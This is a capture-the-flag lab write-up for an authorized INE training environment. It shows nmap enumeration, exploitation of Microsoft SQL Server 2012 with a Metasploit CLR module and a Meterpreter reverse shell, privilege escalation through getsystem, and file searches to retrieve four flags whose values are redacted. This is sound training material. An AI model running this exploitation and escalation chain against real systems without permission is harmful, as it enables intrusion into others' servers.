# Lab Notes: Host & Network Penetration Testing — The Metasploit Framework CTF 1

## Lab Information

- **Platform:** INE
- **Target hostname:** `target.ine.local`
- **Target OS:** Windows Server
- **Tools:** Nmap, Metasploit Framework, Meterpreter, Windows Command Prompt
- **Objective:** Investigate the target and retrieve four flags.

**Redaction notice:** Flag values are intentionally omitted from this public write-up.

---

## Flag 1: Enumerate and Exploit Microsoft SQL Server

### Step 1: Scan the target

```bash
nmap -sV -sC target.ine.local
```

**Explanation:**

- `nmap` — scans the target for network services.
- `-sV` — attempts to identify service versions.
- `-sC` — runs Nmap's default script set.
- `target.ine.local` — target hostname.

The scan identified Windows services and Microsoft SQL Server 2012 on TCP port `1433`. The SQL Server instance was identified as `MSSQLSERVER`.

### Step 2: Launch Metasploit and search for a module

```bash
msfconsole -q
```

- `msfconsole` — starts the Metasploit console.
- `-q` — suppresses the startup banner.

Search for SQL Server-related modules:

```text
search SQL Server 2012
```

The transcript shows a search result named `exploit/windows/mssql/mssql_clr_payload`. Select it:

```text
use 0
```

In this session, result `0` was the SQL Server CLR payload module.

### Step 3: Configure and run the module

```text
set RHOST target.ine.local
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

**Explanation:**

- `set RHOST target.ine.local` — sets the target host.
- `set PAYLOAD windows/x64/meterpreter/reverse_tcp` — selects a 64-bit Windows Meterpreter reverse TCP payload.
- `run` — executes the configured module.

Metasploit reported that a Meterpreter session opened successfully.

### Step 4: Locate and read the first flag

Inside Meterpreter:

```text
pwd
cd /
dir
cat flag1.txt
```

- `pwd` — displays the current working directory.
- `cd /` — changes to the root of the current drive.
- `dir` — lists files and directories.
- `cat flag1.txt` — displays the file contents through Meterpreter.

The listing showed `flag1.txt` in `C:\\`. The first flag was retrieved; its value is redacted.

---

## Flag 2: Access the Windows Configuration Directory

### Step 1: Investigate the access-denied error

The initial attempt to enter the configuration directory failed:

```text
cd Windows
cd System32
cd config
```

The transcript showed an access-denied error when entering `config`.

### Step 2: Inspect privileges

```text
getprivs
```

`getprivs` lists the privileges available to the current Meterpreter process token. The output included `SeImpersonatePrivilege`.

### Step 3: Escalate privileges in the lab

```text
getsystem
```

Meterpreter reported that it obtained SYSTEM privileges using a named-pipe impersonation technique.

### Step 4: Locate and read the second flag

```text
cd config
ls
cat flag2.txt
```

- `cd config` — changes into the `config` directory from the current `C:\\Windows\\System32` location.
- `ls` — lists the directory contents.
- `cat flag2.txt` — displays the file contents through Meterpreter.

The directory listing included `flag2.txt`. The second flag was retrieved; its value is redacted.

---

## Flag 3: Search for a Hint in Windows System32

### Step 1: Open a Windows shell

```text
shell
```

Meterpreter created a Windows command shell.

### Step 2: Search recursively for text files

```cmd
dir C:\\Windows\\System32\\*.txt /s /b
```

- `dir` — lists files and directories.
- `C:\\Windows\\System32\\*.txt` — matches `.txt` files under the specified path.
- `/s` — searches the directory and its subdirectories.
- `/b` — prints file paths in a bare format.

The search returned a hint file at:

```text
C:\\Windows\\System32\\drivers\\etc\\EscaltePrivilageToGetThisFlag.txt
```

### Step 3: Read the hint file

```cmd
type C:\\Windows\\System32\\drivers\\etc\\EscaltePrivilageToGetThisFlag.txt
```

`type` displays the contents of a text file in Windows Command Prompt. The file contained the third flag; its value is redacted.

---

## Flag 4: Investigate the Administrator Directory

### Step 1: Navigate to the root of C:

```cmd
cd \\
dir
```

- `cd \\` — changes to the root of the current drive.
- `dir` — lists the directory contents.

The listing showed the `Users` directory.

### Step 2: Navigate to Administrator

```cmd
cd Users
dir
cd Administrator
dir
```

The `Users` listing contained `Administrator`, `MSSQLSERVER`, and `Public`. The Administrator directory contained standard user folders, including `Desktop`.

### Step 3: Locate and read the fourth flag

```cmd
cd Desktop
dir
type flag4.txt
```

- `cd Desktop` — enters the Administrator desktop directory.
- `dir` — lists its contents.
- `type flag4.txt` — displays the flag file.

The fourth flag was retrieved; its value is redacted.

**Shell note:** `cat` is not a standard Windows Command Prompt command. Use `type` in `cmd.exe` to display text files.

---

## Summary

| Flag | Method | Result |
|---|---|---|
| 1 | Nmap enumeration and Metasploit exploitation | Retrieved `C:\\flag1.txt` |
| 2 | Privilege inspection and escalation | Retrieved `C:\\Windows\\System32\\config\\flag2.txt` |
| 3 | Recursive file search | Located and read a hint file under Windows System32 |
| 4 | Manual directory navigation | Retrieved `flag4.txt` from the Administrator desktop |

## Key Lessons

- Enumerate services before selecting an exploitation approach.
- Read module output carefully and verify whether a session was created.
- Understand the current security context when encountering access-denied errors.
- Combine automated enumeration with manual filesystem investigation.
- Use shell-appropriate commands: Meterpreter and Windows Command Prompt have different command sets.
- Redact flags and other sensitive values before publishing.

## Disclaimer

These notes document an authorized INE training lab for educational purposes. Do not test systems without permission. Review INE's current publication rules before sharing detailed lab solutions publicly.
